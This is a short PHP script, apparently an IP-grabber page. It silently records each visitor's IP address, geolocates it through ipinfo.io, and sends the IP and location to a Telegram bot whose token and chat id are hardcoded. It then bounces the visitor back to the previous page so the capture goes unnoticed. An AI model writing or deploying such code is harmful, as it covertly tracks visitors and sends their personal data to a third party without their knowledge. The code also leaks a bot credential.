<?php

//Gets the IP Address from the visitor
$PublicIP = $_SERVER['REMOTE_ADDR'];
//Uses ipinfo.io to get the location of the IP Address, you can use another site but it will probably have a different implementation
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
//Breaks down the JSON object into an array
$json     = json_decode($json, true);
//This variable is the visitor's county
$country  = $json['country'];
//This variable is the visitor's region
$region   = $json['region'];
//This variable is the visitor's city
$city     = $json['city'];

$txt = "IP : $PublicIP || Country : $country ||  Region : $region ||  City : $city";

file_get_contents ("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=5126439799&text=$txt");


?>
<script>
    window.location.back();
</script>


